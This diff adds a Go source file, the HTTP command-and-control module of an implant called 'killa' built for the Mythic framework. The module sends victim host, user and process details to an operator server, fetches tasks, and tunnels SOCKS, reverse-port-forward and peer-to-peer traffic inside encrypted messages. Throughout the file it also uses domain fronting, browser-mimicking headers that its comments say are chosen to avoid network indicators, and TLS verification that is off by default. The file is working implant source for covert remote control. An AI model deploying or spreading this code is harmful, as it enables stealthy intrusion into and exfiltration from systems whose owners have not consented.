@@ -1,0 +1,753 @@
+package http
+
+import (
+	"bytes"
+	"compress/gzip"
+	"crypto/aes"
+	"crypto/cipher"
+	"crypto/hmac"
+	"crypto/rand"
+	"crypto/sha256"
+	"crypto/tls"
+	"crypto/x509"
+	"encoding/base64"
+	"encoding/hex"
+	"encoding/json"
+	"fmt"
+	"io"
+	"log"
+	"net/http"
+	"net/url"
+	"strings"
+	"time"
+
+	"killa/pkg/structs"
+)
+
+// HTTPProfile handles HTTP communication with Mythic
+type HTTPProfile struct {
+	BaseURL       string
+	UserAgent     string
+	EncryptionKey string
+	MaxRetries    int
+	SleepInterval int
+	Jitter        int
+	Debug         bool
+	GetEndpoint   string
+	PostEndpoint  string
+	HostHeader    string            // Override Host header for domain fronting
+	CustomHeaders map[string]string // Additional HTTP headers from C2 profile
+	client        *http.Client
+	CallbackUUID  string // Store callback UUID from initial checkin
+
+	// P2P delegate hooks — set by main.go when TCP P2P children are supported.
+	// GetDelegatesOnly returns only pending delegate messages (no edges). Used by GetTasking.
+	// GetDelegatesAndEdges returns delegates AND edge notifications. Used by PostResponse.
+	// HandleDelegates routes incoming delegate messages from Mythic to the appropriate children.
+	GetDelegatesOnly     func() []structs.DelegateMessage
+	GetDelegatesAndEdges func() ([]structs.DelegateMessage, []structs.P2PConnectionMessage)
+	HandleDelegates      func(delegates []structs.DelegateMessage)
+
+	// Rpfwd hooks — set by main.go for reverse port forward message routing.
+	GetRpfwdOutbound func() []structs.SocksMsg
+	HandleRpfwd      func(msgs []structs.SocksMsg)
+}
+
+// NewHTTPProfile creates a new HTTP profile
+func NewHTTPProfile(baseURL, userAgent, encryptionKey string, maxRetries, sleepInterval, jitter int, debug bool, getEndpoint, postEndpoint, hostHeader, proxyURL, tlsVerify string) *HTTPProfile {
+	profile := &HTTPProfile{
+		BaseURL:       baseURL,
+		UserAgent:     userAgent,
+		EncryptionKey: encryptionKey,
+		MaxRetries:    maxRetries,
+		SleepInterval: sleepInterval,
+		Jitter:        jitter,
+		Debug:         debug,
+		GetEndpoint:   getEndpoint,
+		PostEndpoint:  postEndpoint,
+		HostHeader:    hostHeader,
+	}
+
+	// Configure TLS based on verification mode
+	tlsConfig := buildTLSConfig(tlsVerify)
+
+	// Configure transport with optional proxy
+	transport := &http.Transport{
+		TLSClientConfig:     tlsConfig,
+		MaxIdleConns:        10,
+		MaxIdleConnsPerHost: 5,
+		IdleConnTimeout:     90 * time.Second,
+	}
+
+	// Configure proxy if specified
+	if proxyURL != "" {
+		if proxyU, err := url.Parse(proxyURL); err == nil {
+			transport.Proxy = http.ProxyURL(proxyU)
+		}
+	}
+
+	profile.client = &http.Client{
+		Timeout:   30 * time.Second,
+		Transport: transport,
+	}
+
+	return profile
+}
+
+// buildTLSConfig creates a TLS configuration based on the verification mode.
+// Modes: "none" (skip verification), "system-ca" (OS trust store), "pinned:<hex-sha256>" (cert pin)
+func buildTLSConfig(tlsVerify string) *tls.Config {
+	switch {
+	case tlsVerify == "system-ca":
+		// Use the operating system's certificate trust store
+		return &tls.Config{
+			InsecureSkipVerify: false,
+			MinVersion:         tls.VersionTLS12,
+		}
+	case strings.HasPrefix(tlsVerify, "pinned:"):
+		// Pin to a specific certificate SHA-256 fingerprint
+		fingerprint := strings.TrimPrefix(tlsVerify, "pinned:")
+		expectedHash, err := hex.DecodeString(fingerprint)
+		if err != nil || len(expectedHash) != 32 {
+			// Invalid fingerprint — fall back to skip verify to avoid bricking the agent
+			return &tls.Config{InsecureSkipVerify: true}
+		}
+		return &tls.Config{
+			InsecureSkipVerify: true, // We do our own verification in VerifyPeerCertificate
+			MinVersion:         tls.VersionTLS12,
+			VerifyPeerCertificate: func(rawCerts [][]byte, _ [][]*x509.Certificate) error {
+				if len(rawCerts) == 0 {
+					return fmt.Errorf("no certificates presented")
+				}
+				// Hash the leaf certificate's raw DER bytes
+				hash := sha256.Sum256(rawCerts[0])
+				if !bytes.Equal(hash[:], expectedHash) {
+					return fmt.Errorf("certificate fingerprint mismatch")
+				}
+				return nil
+			},
+		}
+	default:
+		// "none" or unrecognized — skip verification (backward compatible default)
+		return &tls.Config{InsecureSkipVerify: true}
+	}
+}
+
+// Checkin performs the initial checkin with Mythic
+func (h *HTTPProfile) Checkin(agent *structs.Agent) error {
+	checkinMsg := structs.CheckinMessage{
+		Action:       "checkin",
+		PayloadUUID:  agent.PayloadUUID,
+		User:         agent.User,
+		Host:         agent.Host,
+		PID:          agent.PID,
+		OS:           agent.OS,
+		Architecture: agent.Architecture,
+		Domain:       agent.Domain,
+		IPs:          []string{agent.InternalIP},
+		ExternalIP:   agent.ExternalIP,
+		ProcessName:  agent.ProcessName,
+		Integrity:    agent.Integrity,
+	}
+
+	body, err := json.Marshal(checkinMsg)
+	if err != nil {
+		return fmt.Errorf("failed to marshal checkin message: %w", err)
+	}
+
+	// Encrypt if encryption key is provided
+	if h.EncryptionKey != "" {
+		body, err = h.encryptMessage(body)
+		if err != nil {
+			return fmt.Errorf("encryption failed: %w", err)
+		}
+	}
+
+	// Send using Freyja-style format: UUID + JSON, then base64 encode
+	messageData := append([]byte(agent.PayloadUUID), body...)
+	encodedData := base64.StdEncoding.EncodeToString(messageData)
+
+	// Send checkin request to configured endpoint
+	resp, err := h.makeRequest("POST", h.PostEndpoint, []byte(encodedData))
+	if err != nil {
+		return fmt.Errorf("checkin request failed: %w", err)
+	}
+	defer resp.Body.Close()
+
+	if resp.StatusCode != http.StatusOK {
+		return fmt.Errorf("checkin failed with status: %d", resp.StatusCode)
+	}
+
+	// Read and process the checkin response to extract callback UUID
+	respBody, err := readResponseBody(resp)
+	if err != nil {
+		return fmt.Errorf("failed to read checkin response: %w", err)
+	}
+
+	// Decrypt the checkin response if needed
+	var decryptedResponse []byte
+	if h.EncryptionKey != "" {
+		// Base64 decode the response
+		decodedData, err := base64.StdEncoding.DecodeString(string(respBody))
+		if err != nil {
+			// log.Printf("[DEBUG] Failed to decode checkin response: %v", err)
+			return fmt.Errorf("failed to decode checkin response: %w", err)
+		}
+
+		// Decrypt the response
+		decryptedResponse, err = h.decryptResponse(decodedData)
+		if err != nil {
+			// log.Printf("[DEBUG] Failed to decrypt checkin response: %v", err)
+			return fmt.Errorf("failed to decrypt checkin response: %w", err)
+		}
+	} else {
+		decryptedResponse = respBody
+	}
+
+	// Parse the response to extract callback UUID
+	var checkinResponse map[string]interface{}
+	if err := json.Unmarshal(decryptedResponse, &checkinResponse); err != nil {
+		// log.Printf("[DEBUG] Failed to parse checkin response as JSON: %v", err)
+		// log.Printf("[DEBUG] Decrypted response: %s", string(decryptedResponse))
+		return fmt.Errorf("failed to parse checkin response: %w", err)
+	}
+
+	// Extract callback UUID (commonly called 'id' or 'uuid' in response)
+	if callbackID, exists := checkinResponse["id"]; exists {
+		if callbackStr, ok := callbackID.(string); ok {
+			h.CallbackUUID = callbackStr
+			log.Printf("[INFO] Received callback UUID: %s", h.CallbackUUID)
+		}
+	} else if callbackUUID, exists := checkinResponse["uuid"]; exists {
+		if callbackStr, ok := callbackUUID.(string); ok {
+			h.CallbackUUID = callbackStr
+			log.Printf("[INFO] Received callback UUID: %s", h.CallbackUUID)
+		}
+	} else {
+		log.Printf("[WARNING] No callback UUID found in checkin response, using payload UUID")
+		h.CallbackUUID = agent.PayloadUUID
+	}
+
+	return nil
+}
+
+// GetTasking retrieves tasks and inbound SOCKS data from Mythic, sending any pending outbound SOCKS data
+func (h *HTTPProfile) GetTasking(agent *structs.Agent, outboundSocks []structs.SocksMsg) ([]structs.Task, []structs.SocksMsg, error) {
+	taskingMsg := structs.TaskingMessage{
+		Action:      "get_tasking",
+		TaskingSize: -1, // Get all pending tasks (important for SOCKS throughput)
+		Socks:       outboundSocks,
+		// Include agent identification for checkin updates
+		PayloadUUID: h.getActiveUUID(agent), // Use callback UUID if available
+		PayloadType: "killa",
+		C2Profile:   "http",
+	}
+
+	// Collect delegate messages from linked P2P children (no edges — GetTasking can't carry them)
+	if h.GetDelegatesOnly != nil {
+		delegates := h.GetDelegatesOnly()
+		if len(delegates) > 0 {
+			taskingMsg.Delegates = delegates
+		}
+	}
+
+	// Collect rpfwd outbound messages
+	if h.GetRpfwdOutbound != nil {
+		rpfwdMsgs := h.GetRpfwdOutbound()
+		if len(rpfwdMsgs) > 0 {
+			taskingMsg.Rpfwd = rpfwdMsgs
+		}
+	}
+
+	body, err := json.Marshal(taskingMsg)
+	if err != nil {
+		return nil, nil, fmt.Errorf("failed to marshal tasking message: %w", err)
+	}
+
+	// Encrypt if encryption key is provided
+	if h.EncryptionKey != "" {
+		body, err = h.encryptMessage(body)
+		if err != nil {
+			return nil, nil, fmt.Errorf("encryption failed: %w", err)
+		}
+	}
+
+	// Send using Freyja-style format: UUID + JSON, then base64 encode
+	activeUUID := h.getActiveUUID(agent)
+	messageData := append([]byte(activeUUID), body...)
+	encodedData := base64.StdEncoding.EncodeToString(messageData)
+
+	resp, err := h.makeRequest("POST", h.PostEndpoint, []byte(encodedData))
+	if err != nil {
+		// log.Printf("[DEBUG] GetTasking makeRequest failed: %v", err)
+		return nil, nil, fmt.Errorf("get tasking request failed: %w", err)
+	}
+	defer resp.Body.Close()
+
+	// log.Printf("[DEBUG] GetTasking response status: %d", resp.StatusCode)
+
+	if resp.StatusCode != http.StatusOK {
+		// log.Printf("[DEBUG] GetTasking failed with non-200 status: %d", resp.StatusCode)
+		return nil, nil, fmt.Errorf("get tasking failed with status: %d", resp.StatusCode)
+	}
+
+	respBody, err := readResponseBody(resp)
+	if err != nil {
+		// log.Printf("[DEBUG] Failed to read GetTasking response body: %v", err)
+		return nil, nil, fmt.Errorf("failed to read response body: %w", err)
+	}
+
+	// log.Printf("[DEBUG] GetTasking response body length: %d", len(respBody))
+	// log.Printf("[DEBUG] GetTasking response body: %s", string(respBody))
+
+	// Decrypt the response if encryption key is provided
+	var decryptedData []byte
+	if h.EncryptionKey != "" {
+		// First, base64 decode the response
+		decodedData, err := base64.StdEncoding.DecodeString(string(respBody))
+		if err != nil {
+			return nil, nil, fmt.Errorf("failed to decode response: %w", err)
+		}
+
+		// Decrypt the decoded data
+		decryptedData, err = h.decryptResponse(decodedData)
+		if err != nil {
+			return nil, nil, fmt.Errorf("failed to decrypt response: %w", err)
+		}
+		if h.Debug {
+			// log.Printf("[DEBUG] Decryption successful")
+		}
+	} else {
+		decryptedData = respBody
+	}
+
+	// log.Printf("[DEBUG] Attempting to parse response as JSON")
+
+	// Parse the decrypted response - Mythic returns different formats
+	var taskResponse map[string]interface{}
+	if err := json.Unmarshal(decryptedData, &taskResponse); err != nil {
+		// If not JSON, might be no tasks
+		// log.Printf("[DEBUG] Response is not JSON, assuming no tasks: %v", err)
+		return []structs.Task{}, nil, nil
+	}
+
+	// log.Printf("[DEBUG] Parsed JSON response with %d top-level keys", len(taskResponse))
+	// for key, _ := range taskResponse {
+	//	// log.Printf("[DEBUG] Response contains key: %s", key)
+	// }
+
+	// Extract tasks from response
+	var tasks []structs.Task
+	if taskList, exists := taskResponse["tasks"]; exists {
+		if taskArray, ok := taskList.([]interface{}); ok {
+			for _, taskData := range taskArray {
+				if taskMap, ok := taskData.(map[string]interface{}); ok {
+					task := structs.NewTask(
+						getString(taskMap, "id"),
+						getString(taskMap, "command"),
+						getString(taskMap, "parameters"),
+					)
+					tasks = append(tasks, task)
+				}
+			}
+		}
+	}
+
+	// Extract SOCKS messages from response
+	var inboundSocks []structs.SocksMsg
+	if socksList, exists := taskResponse["socks"]; exists {
+		if socksRaw, err := json.Marshal(socksList); err == nil {
+			if err := json.Unmarshal(socksRaw, &inboundSocks); err != nil {
+				log.Printf("Warning: failed to parse SOCKS messages: %v", err)
+			}
+		}
+	}
+
+	// Route rpfwd messages from Mythic to the rpfwd manager
+	if h.HandleRpfwd != nil {
+		if rpfwdList, exists := taskResponse["rpfwd"]; exists {
+			if rpfwdRaw, err := json.Marshal(rpfwdList); err == nil {
+				var rpfwdMsgs []structs.SocksMsg
+				if err := json.Unmarshal(rpfwdRaw, &rpfwdMsgs); err == nil && len(rpfwdMsgs) > 0 {
+					h.HandleRpfwd(rpfwdMsgs)
+				}
+			}
+		}
+	}
+
+	// Route delegate messages from Mythic to linked P2P children
+	if h.HandleDelegates != nil {
+		if delegateList, exists := taskResponse["delegates"]; exists {
+			if delegateRaw, err := json.Marshal(delegateList); err == nil {
+				var delegates []structs.DelegateMessage
+				if err := json.Unmarshal(delegateRaw, &delegates); err == nil && len(delegates) > 0 {
+					h.HandleDelegates(delegates)
+				}
+			}
+		}
+	}
+
+	return tasks, inboundSocks, nil
+}
+
+// decryptResponse decrypts a response from Mythic using the same format as Freyja
+func (h *HTTPProfile) decryptResponse(encryptedData []byte) ([]byte, error) {
+	if h.EncryptionKey == "" {
+		return encryptedData, nil // No encryption
+	}
+
+	// Decode the base64 key
+	key, err := base64.StdEncoding.DecodeString(h.EncryptionKey)
+	if err != nil {
+		return nil, fmt.Errorf("failed to decode encryption key: %w", err)
+	}
+
+	// The response format should be: UUID (36 bytes) + IV (16 bytes) + Ciphertext + HMAC (32 bytes)
+	if len(encryptedData) < 36+16+32 {
+		return nil, fmt.Errorf("encrypted data too short: %d bytes", len(encryptedData))
+	}
+
+	// Skip UUID (first 36 bytes), extract IV (next 16 bytes)
+	iv := encryptedData[36:52]
+
+	// Extract HMAC (last 32 bytes)
+	hmacBytes := encryptedData[len(encryptedData)-32:]
+
+	// Extract ciphertext (everything between IV and HMAC)
+	ciphertext := encryptedData[52 : len(encryptedData)-32]
+
+	// log.Printf("[DEBUG] Data lengths - Total: %d, UUID: 36, IV: 16, Ciphertext: %d, HMAC: 32", len(encryptedData), len(ciphertext))
+
+	// Verify HMAC
+	mac := hmac.New(sha256.New, key)
+	dataForHmac := encryptedData[:len(encryptedData)-32] // Everything except HMAC
+	mac.Write(dataForHmac)
+	expectedHmac := mac.Sum(nil)
+
+	if h.Debug {
+		// log.Printf("[DEBUG] HMAC verification: %v", hmac.Equal(hmacBytes, expectedHmac))
+	}
+
+	if !hmac.Equal(hmacBytes, expectedHmac) {
+		if h.Debug {
+			// log.Printf("[DEBUG] Primary HMAC failed, trying alternative methods...")
+		}
+
+		// Try HMAC on IV + ciphertext (alternative method for Mythic)
+		mac3 := hmac.New(sha256.New, key)
+		mac3.Write(encryptedData[36 : len(encryptedData)-32]) // IV + ciphertext
+		expectedHmac3 := mac3.Sum(nil)
+
+		if !hmac.Equal(hmacBytes, expectedHmac3) {
+			return nil, fmt.Errorf("HMAC verification failed with all methods")
+		}
+		if h.Debug {
+			// log.Printf("[DEBUG] Alternative HMAC method succeeded")
+		}
+	}
+
+	// Decrypt using AES-CBC
+	block, err := aes.NewCipher(key)
+	if err != nil {
+		return nil, fmt.Errorf("failed to create AES cipher: %w", err)
+	}
+
+	if len(ciphertext) == 0 || len(ciphertext)%aes.BlockSize != 0 {
+		return nil, fmt.Errorf("invalid ciphertext length: %d", len(ciphertext))
+	}
+
+	mode := cipher.NewCBCDecrypter(block, iv)
+	plaintext := make([]byte, len(ciphertext))
+	mode.CryptBlocks(plaintext, ciphertext)
+
+	// Remove PKCS#7 padding
+	padding := int(plaintext[len(plaintext)-1])
+	if padding > aes.BlockSize || padding == 0 {
+		return nil, fmt.Errorf("invalid padding")
+	}
+
+	for i := len(plaintext) - padding; i < len(plaintext); i++ {
+		if plaintext[i] != byte(padding) {
+			return nil, fmt.Errorf("invalid padding")
+		}
+	}
+
+	return plaintext[:len(plaintext)-padding], nil
+}
+
+// GetCallbackUUID returns the callback UUID assigned by Mythic after checkin.
+func (h *HTTPProfile) GetCallbackUUID() string {
+	return h.CallbackUUID
+}
+
+// getActiveUUID returns the callback UUID if available, otherwise the payload UUID
+func (h *HTTPProfile) getActiveUUID(agent *structs.Agent) string {
+	if h.CallbackUUID != "" {
+		// log.Printf("[DEBUG] Using callback UUID: %s", h.CallbackUUID)
+		return h.CallbackUUID
+	}
+	// log.Printf("[DEBUG] Using payload UUID: %s", agent.PayloadUUID)
+	return agent.PayloadUUID
+}
+
+// PostResponse sends a response back to Mythic, optionally including pending SOCKS data
+func (h *HTTPProfile) PostResponse(response structs.Response, agent *structs.Agent, socks []structs.SocksMsg) ([]byte, error) {
+	responseMsg := structs.PostResponseMessage{
+		Action:    "post_response",
+		Responses: []structs.Response{response},
+		Socks:     socks,
+	}
+
+	// Collect rpfwd outbound messages
+	if h.GetRpfwdOutbound != nil {
+		rpfwdMsgs := h.GetRpfwdOutbound()
+		if len(rpfwdMsgs) > 0 {
+			responseMsg.Rpfwd = rpfwdMsgs
+		}
+	}
+
+	// Collect delegate messages and edge notifications from linked P2P children
+	if h.GetDelegatesAndEdges != nil {
+		delegates, edges := h.GetDelegatesAndEdges()
+		if len(delegates) > 0 {
+			responseMsg.Delegates = delegates
+		}
+		if len(edges) > 0 {
+			responseMsg.Edges = edges
+		}
+	}
+
+	body, err := json.Marshal(responseMsg)
+	if err != nil {
+		return nil, fmt.Errorf("failed to marshal response message: %w", err)
+	}
+
+	// Encrypt if encryption key is provided
+	if h.EncryptionKey != "" {
+		body, err = h.encryptMessage(body)
+		if err != nil {
+			return nil, fmt.Errorf("encryption failed: %w", err)
+		}
+	}
+
+	// Send using Freyja-style format: UUID + JSON, then base64 encode
+	// Must use callback UUID (not payload UUID) after checkin
+	activeUUID := h.getActiveUUID(agent)
+	messageData := append([]byte(activeUUID), body...)
+	encodedData := base64.StdEncoding.EncodeToString(messageData)
+
+	resp, err := h.makeRequest("POST", h.PostEndpoint, []byte(encodedData))
+	if err != nil {
+		return nil, fmt.Errorf("post response request failed: %w", err)
+	}
+	defer resp.Body.Close()
+
+	// Read response body
+	respBody, err := readResponseBody(resp)
+	if err != nil {
+		return nil, fmt.Errorf("failed to read PostResponse body: %w", err)
+	}
+
+	if resp.StatusCode != http.StatusOK {
+		return nil, fmt.Errorf("post response failed with status: %d", resp.StatusCode)
+	}
+
+	// Decrypt the response if encryption key is provided (same as GetTasking)
+	var decryptedData []byte
+	if h.EncryptionKey != "" {
+		// First, base64 decode the response
+		decodedData, err := base64.StdEncoding.DecodeString(string(respBody))
+		if err != nil {
+			return nil, fmt.Errorf("failed to decode PostResponse: %w", err)
+		}
+
+		// Decrypt the decoded data
+		decryptedData, err = h.decryptResponse(decodedData)
+		if err != nil {
+			return nil, fmt.Errorf("failed to decrypt PostResponse: %w", err)
+		}
+		if h.Debug {
+			// log.Printf("[DEBUG] PostResponse decryption successful")
+		}
+	} else {
+		decryptedData = respBody
+	}
+
+	// Route any PostResponse data (delegates, rpfwd) from Mythic
+	if len(decryptedData) > 0 {
+		var postRespData map[string]interface{}
+		if err := json.Unmarshal(decryptedData, &postRespData); err == nil {
+			// Route rpfwd messages
+			if h.HandleRpfwd != nil {
+				if rpfwdList, exists := postRespData["rpfwd"]; exists {
+					if rpfwdRaw, err := json.Marshal(rpfwdList); err == nil {
+						var rpfwdMsgs []structs.SocksMsg
+						if err := json.Unmarshal(rpfwdRaw, &rpfwdMsgs); err == nil && len(rpfwdMsgs) > 0 {
+							h.HandleRpfwd(rpfwdMsgs)
+						}
+					}
+				}
+			}
+			// Route delegate messages
+			if h.HandleDelegates != nil {
+				if delegateList, exists := postRespData["delegates"]; exists {
+					if delegateRaw, err := json.Marshal(delegateList); err == nil {
+						var delegates []structs.DelegateMessage
+						if err := json.Unmarshal(delegateRaw, &delegates); err == nil && len(delegates) > 0 {
+							h.HandleDelegates(delegates)
+						}
+					}
+				}
+			}
+		}
+	}
+
+	return decryptedData, nil
+}
+
+// makeRequest is a helper function to make HTTP requests
+func (h *HTTPProfile) makeRequest(method, path string, body []byte) (*http.Response, error) {
+	// Ensure proper URL construction with forward slash
+	var url string
+	if strings.HasSuffix(h.BaseURL, "/") && strings.HasPrefix(path, "/") {
+		// Both have slash, remove one
+		url = h.BaseURL + path[1:]
+	} else if !strings.HasSuffix(h.BaseURL, "/") && !strings.HasPrefix(path, "/") {
+		// Neither has slash, add one
+		url = h.BaseURL + "/" + path
+	} else {
+		// One has slash, just concatenate
+		url = h.BaseURL + path
+	}
+
+	if h.Debug {
+		// log.Printf("[DEBUG] Making %s request to %s (body length: %d)", method, url, len(body))
+	}
+
+	var reqBody io.Reader
+	if body != nil {
+		reqBody = bytes.NewReader(body)
+	}
+
+	req, err := http.NewRequest(method, url, reqBody)
+	if err != nil {
+		return nil, fmt.Errorf("failed to create request: %w", err)
+	}
+
+	// Set browser-realistic default headers to blend with legitimate traffic.
+	// These match common browser behavior and avoid network-level IOCs
+	// (e.g., bare Content-Type: text/plain or missing Accept-Language).
+	// All defaults are overridable via CustomHeaders from the C2 profile.
+	req.Header.Set("User-Agent", h.UserAgent)
+	if body != nil {
+		req.Header.Set("Content-Type", "application/x-www-form-urlencoded")
+	}
+	req.Header.Set("Accept", "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8")
+	req.Header.Set("Accept-Language", "en-US,en;q=0.9")
+	req.Header.Set("Accept-Encoding", "gzip, deflate")
+
+	// Apply custom headers from C2 profile — these override any defaults above
+	for k, v := range h.CustomHeaders {
+		req.Header.Set(k, v)
+	}
+
+	// Override Host header for domain fronting
+	if h.HostHeader != "" {
+		req.Host = h.HostHeader
+	}
+
+	if h.Debug {
+		// log.Printf("[DEBUG] Making %s request to %s", method, url)
+	}
+
+	resp, err := h.client.Do(req)
+	if err != nil {
+		// Close body if resp is non-nil on error (e.g., redirect errors)
+		if resp != nil && resp.Body != nil {
+			resp.Body.Close()
+		}
+		return nil, fmt.Errorf("HTTP request failed: %w", err)
+	}
+
+	return resp, nil
+}
+
+// readResponseBody reads and decompresses the response body if needed.
+// When Accept-Encoding is set explicitly (for OPSEC-realistic headers), Go's
+// http.Transport does NOT auto-decompress responses. This helper transparently
+// handles gzip-compressed responses from CDNs, proxies, or load balancers.
+func readResponseBody(resp *http.Response) ([]byte, error) {
+	if resp.Header.Get("Content-Encoding") == "gzip" {
+		gr, err := gzip.NewReader(resp.Body)
+		if err != nil {
+			return nil, fmt.Errorf("gzip decompression failed: %w", err)
+		}
+		defer gr.Close()
+		return io.ReadAll(gr)
+	}
+	return io.ReadAll(resp.Body)
+}
+
+// getString safely gets a string value from a map
+func getString(m map[string]interface{}, key string) string {
+	if val, exists := m[key]; exists {
+		if str, ok := val.(string); ok {
+			return str
+		}
+	}
+	return ""
+}
+
+// encryptMessage encrypts a message exactly like Freyja's AesEncrypt.
+// Returns an error if encryption fails — never falls back to plaintext to avoid leaking unencrypted data.
+func (h *HTTPProfile) encryptMessage(msg []byte) ([]byte, error) {
+	if h.EncryptionKey == "" {
+		return msg, nil
+	}
+
+	key, err := base64.StdEncoding.DecodeString(h.EncryptionKey)
+	if err != nil {
+		return nil, fmt.Errorf("failed to decode encryption key: %w", err)
+	}
+
+	block, err := aes.NewCipher(key)
+	if err != nil {
+		return nil, fmt.Errorf("failed to create AES cipher: %w", err)
+	}
+
+	iv := make([]byte, aes.BlockSize)
+	if _, err := io.ReadFull(rand.Reader, iv); err != nil {
+		return nil, fmt.Errorf("failed to generate IV: %w", err)
+	}
+
+	mode := cipher.NewCBCEncrypter(block, iv)
+
+	padded, err := pkcs7Pad(msg, aes.BlockSize)
+	if err != nil {
+		return nil, fmt.Errorf("failed to pad message: %w", err)
+	}
+
+	encrypted := make([]byte, len(padded))
+	mode.CryptBlocks(encrypted, padded)
+
+	ivCiphertext := append(iv, encrypted...)
+
+	hmacHash := hmac.New(sha256.New, key)
+	hmacHash.Write(ivCiphertext)
+	hmacBytes := hmacHash.Sum(nil)
+
+	return append(ivCiphertext, hmacBytes...), nil
+}
+
+// pkcs7Pad adds PKCS#7 padding (matching Freyja's implementation)
+func pkcs7Pad(data []byte, blockSize int) ([]byte, error) {
+	if blockSize <= 0 {
+		return nil, fmt.Errorf("invalid blocksize")
+	}
+	if len(data) == 0 {
+		return nil, fmt.Errorf("invalid PKCS7 data (empty or not padded)")
+	}
+	padding := blockSize - len(data)%blockSize
+	padText := bytes.Repeat([]byte{byte(padding)}, padding)
+	return append(data, padText...), nil
+}
